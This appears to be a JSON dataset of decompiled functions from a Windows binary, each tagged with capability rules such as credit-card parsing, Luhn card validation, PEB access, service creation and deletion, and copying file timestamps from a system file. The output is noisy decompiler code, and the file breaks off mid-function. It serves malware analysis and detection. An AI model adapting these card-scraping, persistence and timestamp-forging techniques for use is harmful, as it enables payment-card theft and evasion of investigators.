{
    "00401000": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401073) overlaps instruction at (ram,0x00401072)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00401000(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    ushort in_CX;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    ushort in_DX;\n    int32_t unaff_EBX;\n    uint uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar8;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint *puVar11;\n    ushort in_CS;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    uint *puVar7;\n    \n    // [00] -r-x section size 20480 named .text\n    puVar5 = &stack0xffffffc8 ^ *(unaff_EBX + 0x53);\n    *(puVar5 + -2) = in_CX;\n    *(puVar5 + -1) = in_DX;\n    uVar4 = *puVar5;\n    *puVar5 = 7;\n    puVar5[-1] = 0x422078;\n    puVar5[-2] = arg_1ch;\n    puVar5[-3] = arg_18h;\n    puVar5[-4] = 0x40104e;\n    var_4h = fcn.004048d0(puVar5[-3], puVar5[-2], puVar5[-1], *puVar5);\n    puVar6 = puVar5 + 1;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    *puVar5 = uVar4;\n    uVar2 = 0;\n    var_24h = 0;\n    puVar8 = &fcn.00401000::var_23h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    while( true ) {\n        pcVar1 = _sym.imp.MSVCRT.dll_rand;\n        *puVar8 = uVar2;\n        *(puVar8 + 2) = uVar2;\n        puVar10 = NULL;\n        do {\n            puVar9 = puVar10;\n            *(puVar6 + -2) = uVar2;\n            *(puVar6 + -6) = iVar3;\n            *(puVar6 + -10) = in_EAX;\n            in_EAX = *(puVar6 + -10);\n            puVar7 = puVar6 + -4;\n            puVar6 = puVar6 + -4;\n            *puVar7 = 0x40108b;\n            uVar2 = (*pcVar1)();\n            uVar2 = uVar2 & 0x800000ff;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n            }\n            (&stack0xffffffd8)[puVar9] = uVar2;\n            puVar10 = puVar9 + 1;\n            iVar3 = extraout_ECX;\n        } while (puVar10 < 0x20);\n        if (puVar10 < 0x21) break;\n        *(puVar6 + -2) = in_EAX;\n        in_EAX = in_EAX & 0xffff0000 | *(puVar6 + -2);\n        if (0x20 < puVar10) break;\n        if (!SBORROW4(puVar10, 0x20)) {\n            *(puVar6 + -4) = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar8 = puVar9 + 5;\n        *puVar10 = uVar2;\n    }\n    puVar8 = &stack0xffffffd8;\n    puVar11 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    *(puVar6 + -4) = pcVar1;\n    *(puVar6 + -6) = uVar2;\n    uVar4 = *(puVar6 + -4);\n    *(puVar6 + -4) = var_4h;\n    *(puVar6 + -8) = 0x20;\n    *(puVar6 + -0xc) = &stack0xffffffd8;\n    *(puVar6 + -0x10) = arg_14h;\n    *(puVar6 + -0x14) = arg_10h;\n    *(puVar6 + -0x18) = arg_ch;\n    *(puVar6 + -0x1c) = arg_8h;\n    *(puVar6 + -0x20) = 0x40110f;\n    fcn.00402770(*(puVar6 + -0x1c), *(puVar6 + -0x18), *(puVar6 + -0x14), *(puVar6 + -0x10), *(puVar6 + -0xc), \n                 *(puVar6 + -8), *(puVar6 + -4));\n    *(puVar6 + -4) = uVar4;\n    *(puVar6 + -4) = arg_1ch;\n    *(puVar6 + -8) = arg_18h;\n    *(puVar6 + -0xc) = 0x40112c;\n    fcn.00403d00();\n    return 1;\n}\n",
        "token_count": 1359
    },
    "00404ab0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b35) overlaps instruction at (ram,0x00404b33)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.00404ab0(int16_t *arg_8h)\n\n{\n    char cVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    uint32_t in_EDX;\n    uint extraout_EDX;\n    char *unaff_EBX;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t unaff_EDI;\n    uint32_t uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint8_t in_IF;\n    bool bVar11;\n    uint64_t uVar12;\n    uchar uStack17;\n    uint var_4h;\n    \n    bVar11 = false;\n    uStack17 = unaff_EDI >> 0x18;\n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    puVar2 = *(arg_8h + 0x1e) + arg_8h;\n    if (*puVar2 != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if ((*puVar2 < 0x4551) || (0x4550 < *puVar2)) {\n        in_EDX = puVar2[0x16];\n        piVar4 = arg_8h;\n    }\n    else {\n        cVar1 = *unaff_EBX;\n        *(unaff_EDI + -0x75) = *(unaff_EDI + -0x75) - &uStack17;\n        piVar4 = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) - cVar1, arg_8h);\n    }\n    bVar10 = in_EDX == 0;\n    if (!bVar10) {\n        return in_EDX << 0x20;\n    }\n    uVar8 = 0x40;\n    if ((!bVar10) && (bVar10)) {\n        bVar11 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    if (*(piVar4 + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(piVar4 + 0x1e) < 0xc0) {\n        uVar8 = *(piVar4 + 0x1e) - 0x80;\n    }\n    uVar12 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar8);\n    puVar7 = uVar12;\n    if (puVar7 == NULL) {\n        return uVar12 & 0xffffffff00000000;\n    }\n    uVar5 = 0;\n    if (uVar8 != 0) {\n        do {\n            iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar6 = uVar5 + 1;\n            *(uVar5 + puVar7) = iVar3 % 0xff;\n            uVar5 = uVar6;\n        } while (uVar6 < uVar8);\n    }\n    puVar9 = arg_8h + 0x40;\n    for (uVar5 = uVar8 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar9 = *puVar7;\n        puVar7 = puVar7 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar9 = *puVar7;\n        puVar7 = puVar7 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(uVar12);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 964
    },
    "00401470": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401570) overlaps instruction at (ram,0x0040156f)\n// \n\nuint __cdecl fcn.00401470(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    uint8_t uVar4;\n    uint in_EAX;\n    uint32_t uVar5;\n    int32_t arg_8h_00;\n    int32_t iVar6;\n    uint uVar7;\n    ushort extraout_DX;\n    uint in_EDX;\n    int32_t *piVar8;\n    int32_t unaff_EBX;\n    uchar *unaff_EDI;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    unkbyte10 extraout_ST0;\n    ulong uVar9;\n    uint uStack116;\n    uint uStack112;\n    code *pcStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint var_4h;\n    \n    uVar9 = CONCAT44(in_EDX, in_EAX);\n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        uVar9 = fcn.00403650();\n        *0x4224e4 = uVar9;\n        in_ST0 = extraout_ST0;\n    }\n    piVar8 = uVar9 >> 0x20;\n    *(uVar9 + -0x7ce92414) = in_ST0;\n    uVar5 = uVar9 - 1;\n    uVar2 = 9 < (uVar5 & 0xf) | in_AF;\n    uVar4 = uVar5 + uVar2 * '\\x06';\n    puVar3 = uVar5 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | in_CF | uVar2 * (0xf9 < uVar4)) * '`';\n    *piVar8 = *piVar8 + -0x3f17207c;\n    *puVar3 = *puVar3 & puVar3;\n    *(unaff_EBX + 0x4224e4) = *(unaff_EBX + 0x4224e4) + (uVar5 >> 8);\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 != -1) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar6 == 0) {\n            return 0;\n        }\n        if (*0x4224e4 != 0) {\n            iVar6 = fcn.00401380(arg_8h_00);\n            *0x4224e4 = iVar6 == 0;\n        }\n        uStack80 = 0x401549;\n        fcn.00403100(0, arg_8h_00);\n        if ((SCARRY4(&stack0xffffffb4, 8)) || (!SCARRY4(&stack0xffffffb4, 8))) {\n            if (*0x4224e4 != 0) {\n                return 1;\n            }\n        }\n        else {\n            uVar1 = in(extraout_DX);\n            *unaff_EDI = uVar1;\n            if (&stack0xffffffb4 < 0xfffffff8 && *0x10 != 0x44) {\n                uStack116 = 0x30;\n                uStack112 = 3;\n                pcStack108 = fcn.00403520;\n                uStack104 = 0;\n                uStack100 = 0;\n                uStack96 = arg_ch;\n                uStack92 = 0;\n                uStack88 = 0;\n                uStack84 = 0;\n                uStack80 = 0;\n                uVar7 = (*_sym.imp.USER32.dll_RegisterClassExA)(&stack0xffffff8c);\n                return uVar7;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 951
    },
    "00404860": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404860(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    uint8_t in_AF;\n    \n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if ((uVar2 < 1) || (0 < uVar2)) {\n        uVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)(uVar2);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n        return uVar3;\n    }\n    in_AF = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f;\n    if (extraout_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(0, uVar2, uVar2, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 349
    },
    "00401140": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040127b) overlaps instruction at (ram,0x00401279)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00401140(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar unaff_SI;\n    uint32_t unaff_EDI;\n    uint *puVar3;\n    ushort in_ES;\n    uchar uVar4;\n    uchar uVar5;\n    uchar uVar6;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    uVar4 = unaff_EDI >> 8;\n    uVar5 = unaff_EDI >> 0x10;\n    uVar6 = unaff_EDI >> 0x18;\n    if ((0x7f < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x80) != &var_80h < 0)) {\n        uVar4 = in_ES >> 8;\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    iVar1 = fcn.00402ef0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00402670();\n    iVar1 = fcn.00402cd0(0x422098);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00401cb0();\n    *0x4224e8 = 1;\n    iVar1 = fcn.00402ea0();\n    if (iVar1 == 0) {\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar3 = &var_1fh;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar3 = &var_80h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar3 = &var_60h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        puVar3 = &var_40h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar1 = fcn.00402f90(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00404970(CONCAT13(unaff_SI, CONCAT12(uVar6, CONCAT11(uVar5, uVar4))));\n            if (iVar1 == 0) {\n                return false;\n            }\n            uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n            iVar1 = fcn.00403920(uVar2 - 0x80, uVar2 - 0x60, uVar2 - 0x20, uVar2 - 0x40);\n            return iVar1 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 948
    },
    "00403290": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032ed) overlaps instruction at (ram,0x004032eb)\n// \n\nuint __cdecl fcn.00403290(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    uint unaff_EDI;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    \n    uStack24 = 0x4032a3;\n    iVar2 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar3 = false;\n    uStack24 = 1;\n    uStack28 = ptr;\n    cVar1 = (*_sym.imp.MSVCRT.dll_fwrite)();\n    if ((bVar3) || (!bVar3)) {\n        cVar1 = (*_sym.imp.MSVCRT.dll_fflush)(iVar2);\n        uStack28 = unaff_EDI;\n        uStack24 = extraout_ECX;\n    }\n    *(unaff_EBX + 0x575114c4) = *(unaff_EBX + 0x575114c4) + cVar1 + 'W';\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar2, &stack0xfffffffc, &stack0xffffffe4);\n    return 1;\n}\n",
        "token_count": 321
    },
    "00404970": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404970(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x422048, &lpBuffer, arg_8h);\n    fcn.00402c50(&var_4h, &var_8h);\n    fcn.00404ab0(var_4h);\n    iVar1 = fcn.00401470(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403100(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 395
    },
    "00401380": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401380(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *unaff_EDI;\n    uint in_stack_00000008;\n    uint hObject;\n    \n    iVar1 = fcn.00402cd0(0x4220a0);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if ((!SBORROW4(iVar1, -1)) && (SBORROW4(iVar1, -1))) {\n        *unaff_EDI = in_stack_00000008;\n        return in_stack_00000008;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 285
    },
    "00402cd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402cd0(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x4224d8)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x4224dc)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x00402dab:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00402dab;\n        }\n        iVar3 = (**0x4224e0)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 364
    },
    "00402ea0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402ea0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401590(0x422034);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00403100": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004031ab)\n\nuint __cdecl fcn.00403100(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x42206c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    bVar10 = SBORROW4(arg_ch, -1);\n    iVar2 = var_4h;\n    if (arg_ch == -1) {\n        iVar2 = fcn.00401590(arg_8h);\n        bVar10 = SBORROW4(iVar2, -1);\n        if (iVar2 == -1) {\n            return 0;\n        }\n    }\n    if ((!bVar10) && (bVar10)) {\n        LOCK();\n        iVar2 = 0x138b2633;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1235
    },
    "00403840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403840(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "004015e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004015e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403520;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401700": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b9d) overlaps instruction at (ram,0x00401b9c)\n// \n\nvoid fcn.00401700(void)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_AH;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    ushort extraout_CX_01;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    char *extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar11;\n    uint8_t uVar12;\n    uint8_t in_AF;\n    uchar uVar13;\n    bool bVar14;\n    bool bVar15;\n    char cVar16;\n    char cVar17;\n    ulong uVar18;\n    uint unaff_retaddr;\n    uint uVar19;\n    uint uVar20;\n    uint32_t uVar21;\n    uint *puStack28;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    uint16_t uStack16;\n    ushort uStack14;\n    \n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x2048;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0x12;\n    uStack14 = 0;\n    uStack20 = 0x2054;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack20 = 0x2068;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack20 = 0x206c;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    puVar6 = unaff_ESI;\n    fcn.00403890();\n    uVar12 = 0;\n    bVar15 = (unaff_ESI & extraout_CX) < 0;\n    uStack16 = 7;\n    uStack14 = 0;\n    uStack20 = 0x2078;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    uVar18 = fcn.00403890();\n    if ((bVar15) || (!bVar15)) {\n        puVar6 = 0x16;\n    }\n    puVar4 = uVar18 + 0x680b6a2f + uVar12;\n    *puVar4 = *puVar4 & 0x42;\n    pcVar1 = (uVar18 >> 0x20) + 0x16;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    fcn.00403890(0x4224b4, puVar6);\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack20 = 0x208c;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x2098;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0xd;\n    uStack14 = 0;\n    uStack20 = 0x20a0;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 